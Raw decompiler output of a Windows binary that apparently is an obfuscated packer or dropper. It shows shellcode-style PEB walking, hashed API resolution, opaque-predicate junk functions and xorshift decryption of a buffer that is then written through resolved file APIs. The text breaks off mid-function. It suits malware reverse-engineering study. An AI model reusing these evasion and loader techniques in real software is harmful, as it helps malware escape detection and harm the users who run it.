/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int (__fastcall *__usercall sub_401120@<eax>(int@<edi>))(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// int __usercall sub_401555@<eax>(int@<eax>);
// int __usercall sub_4016DF@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_401BE6@<eax>(int@<eax>);
// int __usercall sub_401DDC@<eax>(int@<eax>);
// int __usercall sub_401E3C@<eax>(int@<eax>);
// int __usercall sub_402324@<eax>(int@<eax>);
// int __usercall sub_40234C@<eax>(int@<eax>);
// int __usercall sub_402A18@<eax>(int@<eax>);
// int __usercall sub_402F8C@<eax>(int@<eax>);
// int __usercall sub_40300E@<eax>(unsigned int@<ebx>, int@<esi>);
int __cdecl sub_40309A(int);
// int __usercall sub_403344@<eax>(int@<eax>);
// int __usercall sub_403765@<eax>(int@<eax>);
// int __usercall sub_403952@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_403C77@<eax>(int@<eax>);
// int __usercall sub_404038@<eax>(int@<eax>);
// int __usercall sub_404224@<eax>(int@<eax>);
// int __usercall sub_404389@<eax>(int@<eax>);
// int __usercall sub_40445E@<eax>(int@<eax>);
// int __usercall sub_4045E9@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_4047EA@<eax>(int@<eax>);
// int __usercall sub_404DAB@<eax>(int@<eax>);
// int __usercall sub_404E88@<eax>(int@<eax>);
int sub_405021();
int sub_4050D5();
// unsigned int __usercall sub_405302@<eax>(int@<edx>, int@<ebx>);
// int __usercall sub_40582E@<eax>(int@<eax>);
// void __usercall sub_405A4A(unsigned int@<ecx>, void *@<edi>, const void *@<esi>);
// int __usercall sub_405FF9@<eax>(int@<eax>);
// int __usercall sub_4062A2@<eax>(int@<eax>);
unsigned int __cdecl sub_4063CD(_BYTE *);
// int __usercall sub_406523@<eax>(int@<eax>);
// int __usercall sub_40686F@<eax>(int@<esi>);
// int __usercall sub_4069DD@<eax>(int@<eax>);
// int __usercall sub_406D84@<eax>(int@<eax>, int@<ebp>);
int sub_406EB0();
// int __usercall sub_406F5D@<eax>(int@<ebx>, int@<esi>);
// int __usercall sub_4072FB@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_40737C@<eax>(int@<ebp>);
int sub_4078C5();
// int __usercall sub_40798B@<eax>(int@<eax>, int@<ebp>);
// int __usercall sub_407994@<eax>(int@<eax>);
_BYTE *__cdecl sub_407A20(_BYTE *, _BYTE *);
// char __usercall sub_407BA8@<al>(_DWORD *@<ebp>);
// void __usercall sub_40825D(int@<ebp>);
char sub_408305();
// void __usercall start(int@<edx>, int@<ecx>, int@<ebx>, int@<ebp>, int@<edi>, int@<esi>);
// void __usercall sub_4088CA(_DWORD *@<edx>, int@<ecx>, int@<ebp>, int@<edi>);
void __cdecl sub_40894B(int, int, _BYTE *);
// void __userpurge sub_410FB5(int@<eax>, char@<dl>, int@<ecx>, int@<edi>, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN unk_423933; // weak
_UNKNOWN unk_423A33; // weak
int dword_43D004 = 0; // weak
int dword_43D008 = 0; // weak
int dword_43D00C = 0; // weak
int dword_43D010 = 0; // weak
int dword_43D014 = 0; // weak
int dword_43D01C = 0; // weak
int dword_43D020 = 0; // weak
int dword_43D024 = 0; // weak
int dword_43D028 = 0; // weak
int dword_43D02C = 0; // weak
int dword_43D030 = 0; // weak
int dword_43D034 = 0; // weak
int dword_43D038 = 0; // weak
int dword_43D03C = 0; // weak
int dword_43D040 = 0; // weak
int dword_43D044 = 0; // weak
int dword_43D048 = 0; // weak
int dword_43D04C = 0; // weak
char byte_43D074 = '\0'; // weak
int dword_43D208 = 0; // weak
int dword_43D328 = 0; // weak
int dword_43D368 = 0; // weak
int dword_43D374 = 0; // weak
int dword_43D3F0 = -779499895; // weak
int dword_43D404 = 1137909773; // weak
int dword_43D45C = 1281943764; // weak
int dword_43D51C = 412905; // weak
int dword_43D52C = 1139088437; // weak
char byte_43D5A4 = '<'; // weak
int dword_43D7B0 = -2147466270; // weak
int dword_43D8A0 = -795593430; // weak
int dword_43D8BC = 477680001; // weak
int dword_43D9DC = -1996471336; // weak
int dword_43DB4C = -1949857792; // weak
int dword_43DB68 = 822249; // weak
int dword_43DB6C = -1600419072; // weak
int dword_43DD10 = -268355861; // weak
char byte_43DE68 = 'é'; // weak
int dword_43DE74 = 79971715; // weak
int dword_43E020 = 13417216; // weak
int dword_43E028 = 15984; // weak
char byte_43E200 = 'ˆ'; // weak
int dword_43E2A4 = 1376237327; // weak
int dword_43E300 = -1064980993; // weak
int dword_43E354 = -1083334552; // weak
int dword_43E4E4 = -801620599; // weak
int dword_43E550 = -2139085756; // weak
char byte_43E568 = 'G'; // weak
char byte_43E5E4 = 'Ø'; // weak
char byte_43E7AC = '‰'; // weak
int dword_43E820 = 88675123; // weak
int dword_43E824 = 0; // weak
int dword_43E840 = 0; // weak
int dword_43E860 = 0; // weak
int (__fastcall *dword_43E880)(_DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43E884; // weak
int dword_43E888 = 0; // weak
int dword_43E8E8 = 0; // weak
int dword_43E950 = 0; // weak
int (__stdcall *dword_43E987)(_DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43E9AF; // weak
_DWORD dword_43E9B1 = 272727; // weak
int (__fastcall *dword_43E9B5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__fastcall *dword_43E9BD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43E9C1 = 129213; // weak
int dword_43E9C5 = 362436069; // weak
int (__fastcall *dword_43E9C9)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_43E9CD = 0; // weak
int dword_43E9F1 = 0; // weak
int dword_43E9F5 = 521288629; // weak
int dword_43E9F9 = 0; // weak
int dword_43E9FD = -768030584; // weak
int (__thiscall *dword_43EA05)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__thiscall *dword_43EA0D)(_DWORD, _DWORD) = NULL; // weak
int dword_43EA1D = 0; // weak
int (__thiscall *dword_43EA21)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
__int64 (__fastcall *dword_43EA48)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
_UNKNOWN unk_43EA50; // weak
int dword_43EA8C = 0; // weak
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern LONG (__stdcall *InterlockedExchange)(volatile LONG *Target, LONG Value);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);


//----- (00401120) --------------------------------------------------------
int (__fastcall *__usercall sub_401120@<eax>(int a1@<edi>))(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD)
{
  int v1; // edi
  int v2; // edi
  int v3; // ecx
  int v4; // esi
  int v5; // ecx
  int v6; // esi
  int v7; // edx
  int (__fastcall *result)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // eax
  int v9; // esi
  int v10; // eax
  int v11; // [esp-8h] [ebp-8h]
  int v12; // [esp-8h] [ebp-8h]

  result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(262468866);
  v1 = a1 - dword_43D8BC;
  if ( result )
  {
    dword_43D034 -= 19576;
    dword_43E9B5 = result;
    v2 = dword_43E8E8 + v1;
    result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(1493072574);
    dword_43D01C = v2;
    dword_43D024 = v2;
    if ( result )
    {
      dword_43E987 = (int (__stdcall *)(_DWORD, _DWORD))result;
      v4 = 8 * (v3 + 1);
      result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(v12);
      if ( result )
      {
        dword_43D014 = v11 - dword_43DB68;
        dword_43EA05 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
        dword_43D020 -= v11 - dword_43DB68;
        result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(1916711125);
        dword_43D040 = 15859;
        if ( result )
        {
          v5 = v4;
          LOBYTE(v5) = byte_43E200;
          dword_43E880 = (int (__fastcall *)(_DWORD, _DWORD))result;
          dword_43D024 -= v4;
          dword_43D038 += v5;
          result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(-2114916129);
          v6 = (int)&HeapFree + dword_43DB6C;
          LOBYTE(dword_43D038) = dword_43D038 + 28;
          if ( result )
          {
            dword_43EA0D = (int (__thiscall *)(_DWORD, _DWORD))result;
            dword_43D01C = (int)&HeapFree + dword_43DB6C;
            result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(1216340331);
            dword_43D030 = 14633;
            if ( result )
            {
              dword_43E9BD = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
              dword_43D048 = v6;
              result = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40309A(255840707);
              LOBYTE(dword_43D024) = dword_43D024 - 28;
              dword_43D044 += v6;
              if ( result )
              {
                dword_43EA21 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
                v9 = v6 - 26920;
                v10 = sub_40686F(v9);
                dword_43D010 = v9;
                dword_43D020 = 31416;
                dword_43D01C = v10;
                dword_43D004 = v7;
                __asm { retn }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 4020C5: variable 'v3' is possibly undefined
// 40521C: variable 'v12' is possibly undefined
// 40523C: variable 'v11' is possibly undefined
// 405DD1: variable 'v7' is possibly undefined
// 43D004: using guessed type int dword_43D004;
// 43D010: using guessed type int dword_43D010;
// 43D014: using guessed type int dword_43D014;
// 43D01C: using guessed type int dword_43D01C;
// 43D020: using guessed type int dword_43D020;
// 43D024: using guessed type int dword_43D024;
// 43D030: using guessed type int dword_43D030;
// 43D034: using guessed type int dword_43D034;
// 43D038: using guessed type int dword_43D038;
// 43D040: using guessed type int dword_43D040;
// 43D044: using guessed type int dword_43D044;
// 43D048: using guessed type int dword_43D048;
// 43D8BC: using guessed type int dword_43D8BC;
// 43DB68: using guessed type int dword_43DB68;
// 43DB6C: using guessed type int dword_43DB6C;
// 43E200: using guessed type char byte_43E200;
// 43E880: using guessed type int (__fastcall *dword_43E880)(_DWORD, _DWORD);
// 43E8E8: using guessed type int dword_43E8E8;
// 43E987: using guessed type int (__stdcall *dword_43E987)(_DWORD, _DWORD);
// 43E9B5: using guessed type int (__fastcall *dword_43E9B5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E9BD: using guessed type int (__fastcall *dword_43E9BD)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43E9CD: using guessed type int dword_43E9CD;
// 43E9F9: using guessed type int dword_43E9F9;
// 43EA05: using guessed type int (__thiscall *dword_43EA05)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 43EA0D: using guessed type int (__thiscall *dword_43EA0D)(_DWORD, _DWORD);
// 43EA21: using guessed type int (__thiscall *dword_43EA21)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401555) --------------------------------------------------------
int __usercall sub_401555@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  return sub_4045E9(a1, (int)&savedregs);
}

//----- (004016DF) --------------------------------------------------------
int __usercall sub_4016DF@<eax>(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 16) = 165;
  *(_DWORD *)(a2 - 12) = 27;
  *(_DWORD *)(a2 - 8) = 236;
  *(_DWORD *)(a2 - 20) = 230;
  *(_DWORD *)(a2 - 4) = a1 % 236;
  if ( a1 % 236 < 17 )
    return 153;
  else
    return 27;
}

//----- (00401BE6) --------------------------------------------------------
int __usercall sub_401BE6@<eax>(int a1@<eax>)
{
  if ( a1 % 126 < 7 )
    return 684;
  else
    return 17;
}
// 406A1C: conditional instruction was optimized away because %var_1C.4==7E
// 406A22: conditional instruction was optimized away because %var_1C.4==7E

//----- (00401DDC) --------------------------------------------------------
int __usercall sub_401DDC@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  return sub_4072FB(a1, (int)&savedregs);
}

//----- (00401E3C) --------------------------------------------------------
int __usercall sub_401E3C@<eax>(int a1@<eax>)
{
  if ( a1 % 105 < 21 )
    return 131;
  else
    return 72;
}
// 406150: conditional instruction was optimized away because %var_8.4==26

//----- (00402324) --------------------------------------------------------
int __usercall sub_402324@<eax>(int a1@<eax>)
{
  if ( a1 % 104 < 7 )
    return 182;
  else
    return 37;
}
// 401477: conditional instruction was optimized away because %var_20.4==2F
// 40147D: conditional instruction was optimized away because %var_20.4==2F

//----- (0040234C) --------------------------------------------------------
int __usercall sub_40234C@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2
  int v4; // eax

  v2 = a1 % 169;
  v1 = a1 / 169;
  if ( v2 >= 25 )
    return 77;
  v4 = sub_4047EA(v1);
  sub_407994(v4);
  return 708;
}
// 402232: conditional instruction was optimized away because %var_1C.4==CD
// 402238: conditional instruction was optimized away because %var_1C.4==CD
// 40268E: conditional instruction was optimized away because %var_20.4==F0
// 402694: conditional instruction was optimized away because %var_20.4==F0
// 40439A: conditional instruction was optimized away because %var_10.4==83

//----- (00402A18) --------------------------------------------------------
int __usercall sub_402A18@<eax>(int a1@<eax>)
{
  if ( a1 % 168 < 0 )
    return 403;
  else
    return 110;
}
// 40296E: conditional instruction was optimized away because %var_14.4==91
// 40380A: conditional instruction was optimized away because ebx.4==68
// 403811: conditional instruction was optimized away because ebx.4==68
// 407209: conditional instruction was optimized away because %var_14.4==91
// 40720F: conditional instruction was optimized away because %var_14.4==91

//----- (00402F8C) --------------------------------------------------------
int __usercall sub_402F8C@<eax>(int a1@<eax>)
{
  int v2; // eax
  int v3; // et2

  v3 = a1 % 148;
  v2 = a1 / 148;
  if ( v3 >= 17 )
    return 72;
  sub_4047EA(v2);
  return 959;
}
// 402739: conditional instruction was optimized away because %0x14.4==94

//----- (0040300E) --------------------------------------------------------
int __usercall sub_40300E@<eax>(unsigned int a1@<ebx>, int a2@<esi>)
{
  int result; // eax
  unsigned int v3; // ecx
  int v4; // esi
  int v5; // eax

  v5 = sub_406EB0();
  v4 = a2 - dword_43E950;
  BYTE1(v5) -= 3;
  if ( a1 >= 0xB )
  {
    dword_43D010 += v4;
    return sub_405021();
  }
  else
  {
    result = sub_406F5D(v5 + (v3 < dword_43E020) + a1, v4);
    dword_43D00C = 29136;
  }
  return result;
}
// 4046D2: variable 'v3' is possibly undefined
// 43D00C: using guessed type int dword_43D00C;
// 43D010: using guessed type int dword_43D010;
// 43E020: using guessed type int dword_43E020;
// 43E950: using guessed type int dword_43E950;

//----- (0040309A) --------------------------------------------------------
int __cdecl sub_40309A(int a1)
{
  unsigned int i; // esi
  int v3; // ebx
  _DWORD *v4; // edi
  unsigned __int16 *v5; // [esp-Ch] [ebp-10h]
  _DWORD *v6; // [esp-8h] [ebp-Ch]
  int v7; // [esp-4h] [ebp-8h]

  v3 = sub_4050D5();
  v4 = (_DWORD *)(v3 + *(_DWORD *)(v3 + *(_DWORD *)(v3 + 60) + 120));
  if ( !HIWORD(a1) )
  {
    v7 = (unsigned __int16)a1 - v4[4];
    return v3 + *(_DWORD *)(v3 + v4[7] + 4 * v7);
  }
  v6 = (_DWORD *)(v3 + v4[8]);
  v5 = (unsigned __int16 *)(v3 + v4[9]);
  for ( i = 0; v4[6] > i; ++i )
  {
    if ( sub_4063CD((_BYTE *)(v3 + *v6)) == a1 )
    {
      v7 = *v5;
      break;
    }
    ++v6;
    ++v5;
  }
  if ( v4[6] != i )
    return v3 + *(_DWORD *)(v3 + v4[7] + 4 * v7);
  return 0;
}
// 403828: variable 'v7' is possibly undefined

//----- (00403344) --------------------------------------------------------
int __usercall sub_403344@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 100;
  v1 = a1 / 100;
  if ( v2 >= 22 )
    return 159;
  sub_40234C(v1);
  return 790;
}
// 405B6E: conditional instruction was optimized away because %var_10.4==AC
// 405B74: conditional instruction was optimized away because %var_10.4==AC
// 405B7B: conditional instruction was optimized away because %var_10.4==AC

//----- (00403765) --------------------------------------------------------
int __usercall sub_403765@<eax>(int a1@<eax>)
{
  if ( a1 % 83 < 29 )
    return 6;
  else
    return 198;
}
// 402268: conditional instruction was optimized away because %var_2C.4==68
// 402274: conditional instruction was optimized away because %var_1C.4==5A
// 4029F1: conditional instruction was optimized away because %var_8.4==FC
// 402A33: conditional instruction was optimized away because %var_28.4==E9
// 402A39: conditional instruction was optimized away because %var_28.4==E9
// 404D89: conditional instruction was optimized away because %var_2C.4==68
// 406A9B: conditional instruction was optimized away because %var_4.4==5D

//----- (00403952) --------------------------------------------------------
int __usercall sub_403952@<eax>(int a1@<eax>, int a2@<ebp>)
{
  int v2; // edx

  *(_DWORD *)(a2 - 16) = 139;
  *(_DWORD *)(a2 - 12) = 20;
  *(_DWORD *)(a2 - 8) = 3;
  *(_DWORD *)(a2 - 20) = 108;
  *(_DWORD *)(a2 - 4) = 223;
  v2 = a1 % 19;
  *(_DWORD *)(a2 - 32) = v2;
  if ( v2 < 20 )
    return 639;
  else
    return 194;
}

//----- (00403C77) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_403C77@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_40798B(a1, (int)&savedregs);
}
// 403C7A: bad sp value at call

//----- (00404038) --------------------------------------------------------
int __usercall sub_404038@<eax>(int a1@<eax>)
{
  if ( a1 % 19 < 0 )
    return 336;
  else
    return 69;
}
// 403962: conditional instruction was optimized away because %var_C.4==79
// 406370: conditional instruction was optimized away because %var_54.4==1E

//----- (00404224) --------------------------------------------------------
int __usercall sub_404224@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 32;
  v1 = a1 / 32;
  if ( v2 >= 11 )
    return 13;
  sub_4047EA(v1);
  return 402;
}
// 401D80: conditional instruction was optimized away because %var_18.4==47
// 40752B: conditional instruction was optimized away because %var_18.4==47

//----- (00404389) --------------------------------------------------------
int __usercall sub_404389@<eax>(int a1@<eax>)
{
  if ( a1 % 64 < 29 )
    return 284;
  else
    return 0;
}
// 4046AC: conditional instruction was optimized away because %var_2C.4==58

//----- (0040445E) --------------------------------------------------------
int __usercall sub_40445E@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2
  int v4; // eax

  v2 = a1 % 17;
  v1 = a1 / 17;
  if ( v2 >= 28 )
    return 184;
  v4 = sub_405FF9(v1);
  sub_401DDC(v4);
  return 260;
}
// 403EA8: conditional instruction was optimized away because %var_14.4==28

//----- (004045E9) --------------------------------------------------------
int __usercall sub_4045E9@<eax>(int a1@<eax>, int a2@<ebp>)
{
  *(_DWORD *)(a2 - 24) = 189;
  *(_DWORD *)(a2 - 12) = 117;
  *(_DWORD *)(a2 - 16) = 168;
  *(_DWORD *)(a2 - 8) = 237;
  *(_DWORD *)(a2 - 20) = 80;
  *(_DWORD *)(a2 - 4) = 67;
  if ( a1 % 200 < 26 )
    return 212;
  else
    return 105;
}

//----- (004047EA) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_4047EA@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_403952(a1, (int)&savedregs);
}
// 4047ED: bad sp value at call

//----- (00404DAB) --------------------------------------------------------
int __usercall sub_404DAB@<eax>(int a1@<eax>)
{
  int v2; // eax

  if ( a1 % 13 >= 37 )
    return 22;
  v2 = sub_4047EA(0);
  sub_401BE6(v2);
  return 246;
}
// 401933: conditional instruction was optimized away because esi.4==70

//----- (00404E88) --------------------------------------------------------
int __usercall sub_404E88@<eax>(int a1@<eax>)
{
  int v1; // eax
  int v2; // et2

  v2 = a1 % 167;
  v1 = a1 / 167;
  if ( v2 >= 13 )
    return 111;
  sub_4062A2(v1);
  return 321;
}
// 403321: conditional instruction was optimized away because %var_10.4==C6
// 403327: conditional instruction was optimized away because %var_10.4==C6
// 40332E: conditional instruction was optimized away because %var_10.4==C6
// 405C5B: conditional instruction was optimized away because %var_C.4==60

//----- (00405021) --------------------------------------------------------
int sub_405021()
{
  int v0; // eax
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  sub_4047EA(195);
  v0 = dword_43E9C1 ^ (dword_43E9C1 << 11);
  v2 = v0;
  dword_43E9C1 = dword_43E9C5;
  dword_43E9C5 = dword_43E9F5;
  sub_4047EA(v0);
  dword_43E9F5 = dword_43E820;
  dword_43E820 ^= (v2 >> 8) ^ v2 ^ ((unsigned int)dword_43E820 >> 19);
  return dword_43E820;
}
// 43E820: using guessed type int dword_43E820;
// 43E9C1: using guessed type int dword_43E9C1;
// 43E9C5: using guessed type int dword_43E9C5;
// 43E9F5: using guessed type int dword_43E9F5;

//----- (004050D5) --------------------------------------------------------
int sub_4050D5()
{
  int v0; // edi
  unsigned int v1; // esi
  int v2; // ecx
  int v3; // ebx
  int v4; // eax
  int v5; // ebx
  int result; // eax
  int v7; // ebx
  struct _PEB *v8; // edx
  struct _LIST_ENTRY *Flink; // edx

  v7 = dword_43D3F0;
  v8 = NtCurrentPeb();
  LOBYTE(dword_43D00C) = dword_43D00C - 52;
  LOBYTE(dword_43D034) = -23;
  Flink = v8->Ldr->InMemoryOrderModuleList.Flink;
  do
  {
    LOBYTE(dword_43D048) = 55;
    v1 = (unsigned int)Flink[5].Flink;
    v3 = (v1 ^ v7) - (_DWORD)Flink;
    v2 = 24;
    LOBYTE(v3) = -41;
    v0 = 0;
    LOBYTE(dword_43D01C) = -16;
    do
    {
      BYTE1(v3) = v2;
      v4 = 0;
      v5 = dword_43DE74 + v3 - dword_43DD10;
      dword_43D010 = 30077;
      LOBYTE(v4) = *(_BYTE *)v1++;
      if ( (char)v4 >= 97 )
      {
        dword_43D038 = 13574;
        LOBYTE(v4) = v4 - 32;
        v5 += 29639;
      }
      dword_43D028 = v5;
      v0 = v4 + __ROR4__(v0, 13);
      v3 = dword_43D8BC;
      LOBYTE(dword_43D01C) = dword_43D01C - 123;
      --v2;
    }
    while ( v2 );
    v7 = (int)Flink[2].Flink;
    LOBYTE(dword_43D024) = dword_43D024 - 13;
    Flink = Flink->Flink;
    dword_43D008 -= dword_43DB4C + v0;
  }
  while ( v0 != 1783282779 );
  result = v7;
  LOBYTE(dword_43D014) = dword_43D014 - 84;
  return result;
}
// 43D008: using guessed type int dword_43D008;
// 43D00C: using guessed type int dword_43D00C;
// 43D010: using guessed type int dword_43D010;
// 43D014: using guessed type int dword_43D014;
// 43D01C: using guessed type int dword_43D01C;
// 43D024: using guessed type int dword_43D024;
// 43D028: using guessed type int dword_43D028;
// 43D034: using guessed type int dword_43D034;
// 43D038: using guessed type int dword_43D038;
// 43D048: using guessed type int dword_43D048;
// 43D3F0: using guessed type int dword_43D3F0;
// 43D8BC: using guessed type int dword_43D8BC;
// 43DB4C: using guessed type int dword_43DB4C;
// 43DD10: using guessed type int dword_43DD10;
// 43DE74: using guessed type int dword_43DE74;

//----- (00405302) --------------------------------------------------------
unsigned int __usercall sub_405302@<eax>(int a1@<edx>, int a2@<ebx>)
{
  unsigned int result; // eax
  unsigned int retaddr; // [esp+0h] [ebp+0h]

  dword_43D01C = a2;
  dword_43E9FD ^= a1 + 891;
  LOBYTE(dword_43D02C) = dword_43D02C + 28;
  result = retaddr & 0xFFFF0000;
  dword_43E9CD = retaddr & 0xFFFF0000;
  return result;
}
// 43D01C: using guessed type int dword_43D01C;
// 43D02C: using guessed type int dword_43D02C;
// 43E9CD: using guessed type int dword_43E9CD;
// 43E9FD: using guessed type int dword_43E9FD;

//----- (0040582E) --------------------------------------------------------
int __usercall sub_40582E@<eax>(int a1@<eax>)
{
  if ( a1 % 159 < 37 )
    return 184;
  else
    return 14;
}
// 4037DA: conditional instruction was optimized away because %var_10.4==C0
// 4037E0: conditional instruction was optimized away because %var_10.4==C0

//----- (00405A4A) --------------------------------------------------------
void __usercall sub_405A4A(unsigned int a1@<ecx>, void *a2@<edi>, const void *a3@<esi>)
{
  qmemcpy(a2, a3, a1);
}

//----- (00405FF9) --------------------------------------------------------
int __usercall sub_405FF9@<eax>(int a1@<eax>)
{
  if ( a1 % 91 >= 0 )
    return 174;
  sub_405FF9(151);
  return 476;
}
// 40753C: conditional instruction was optimized away because %0x10.4==64

//----- (004062A2) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_4062A2@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  return sub_4016DF(a1, (int)&savedregs);
}
// 4062A5: bad sp value at call

//----- (004063CD) --------------------------------------------------------
unsigned int __cdecl sub_4063CD(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (00406523) --------------------------------------------------------
int __usercall sub_406523@<eax>(int a1@<eax>)
{
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  return sub_406D84(a1, (int)&savedregs);
}

//----- (0040686F) --------------------------------------------------------
int __usercall sub_40686F@<eax>(int a1@<esi>)
{
  int v1; // ecx
  int v2; // esi
  int v3; // eax
  unsigned int v4; // esi
  int v5; // edx
  __int64 v6; // rax
  int v7; // ecx
  _BYTE *v8; // edi
  int v9; // ebx
  int v10; // ebx
  int v11; // eax
  char v12; // al
  int v13; // edx
  int v14; // ecx
  int v15; // eax
  int v16; // edx
  int v17; // ecx
  bool v18; // cf
  _BYTE *v19; // edi
  int v20; // esi
  int v21; // ebx
  int v22; // ecx
  int v23; // ebx
  int v24; // ecx
  int v25; // esi
  _BYTE *v26; // edi
  int v27; // edx
  int v28; // ecx
  unsigned int v29; // esi
  char v30; // dh
  int v31; // edx
  int v32; // ecx
  _BYTE *v33; // esi
  int v34; // edx
  int v35; // eax
  int v37; // [esp-8h] [ebp-8h]
  int v38; // [esp-4h] [ebp-4h]

  LOBYTE(dword_43D044) = -56;
  v24 = 0x2000;
  v25 = a1 + 1;
  v10 = dword_43E550;
  v26 = &unk_423A33;
  LOBYTE(v10) = byte_43E7AC + dword_43E550;
  do
  {
    dword_43D03C -= v25;
    v38 = v24;
    dword_43D040 = 4379;
    v12 = sub_406F5D(v10 - 13437, v25);
    dword_43D014 += v25;
    v10 = 4279;
    *v26++ = v12;
    v25 = 5326;
    v24 = v38 - 1;
  }
  while ( v38 != 1 );
  v23 = 4426898;
  v2 = SBYTE1(dword_43D51C);
  v3 = dword_43E987(255, &unk_423933);
  dword_43D01C = 32708;
  dword_43D00C = v3;
  v4 = v2 - (v18 + v3);
  LOBYTE(v23) = byte_43E5E4 + (unsigned __int8)&InterlockedIncrement;
  dword_43D010 -= 29138;
  v18 = v4 < dword_43D368;
  v29 = v4 - dword_43D368;
  BYTE1(v31) = v18 + v30 - 64;
  dword_43D048 = v23;
  dword_43E9B5(v29 ^ v32, v31 - dword_43D374, &unk_423933, &unk_43E9AF, 0, &dword_43E888);
  dword_43D028 = 29305;
  dword_43D01C = 8563;
  dword_43D04C -= v29 - 1;
  LOBYTE(dword_43D004) = dword_43D004 + 8;
  dword_43D048 = dword_43E4E4;
  v11 = dword_43EA05(21962, &dword_43E888, -1073741824, 1, 0, 2, 32, 0);
  LOBYTE(dword_43D020) = dword_43D020 - 59;
  BYTE1(v5) -= 4;
  dword_43D014 += v5;
  dword_43EA21((unsigned int)&HeapFree & 0xE81, v11, &unk_423A33, 0x2000, &dword_43EA48, 0, v11);
  dword_43E880(v14, v13);
  v22 = 0x2000;
  v20 = dword_43D328;
  v19 = &unk_423A33;
  dword_43D038 = dword_43D328;
  v21 = dword_43E820;
  do
  {
    v18 = __CFADD__(byte_43DE68, (_BYTE)v21);
    LOBYTE(v21) = byte_43DE68 + v21;
    dword_43D04C = dword_43D9DC + v20;
    v37 = v22;
    BYTE1(v21) = 43;
    *v19++ = sub_406F5D(v21, dword_43D9DC + v20 - (v18 + 18889));
    v20 = dword_43E028;
    v21 = (int)v19;
    dword_43D02C -= dword_43E028;
    dword_43D024 = (int)v19;
    v22 = v37 - 1;
  }
  while ( v37 != 1 );
  dword_43D04C = 0;
  LODWORD(v6) = sub_40309A(1769630462);
  dword_43D02C = (int)v19;
  if ( (_DWORD)v6 )
  {
